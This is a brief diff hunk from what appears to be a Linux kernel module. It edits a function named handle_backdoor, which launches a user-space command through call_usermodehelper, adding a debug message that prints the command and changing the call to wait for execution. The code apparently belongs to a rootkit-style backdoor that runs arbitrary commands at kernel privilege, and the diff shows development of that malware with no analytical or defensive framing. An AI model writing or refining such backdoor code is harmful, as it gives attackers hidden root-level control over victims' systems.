@@ -102,7 +102,9 @@ handle_backdoor(unsigned long arg)
         NULL
     };
 
-    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    DEBUG_INFO("executing %s\n", buf);
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     return 0;
 }
 
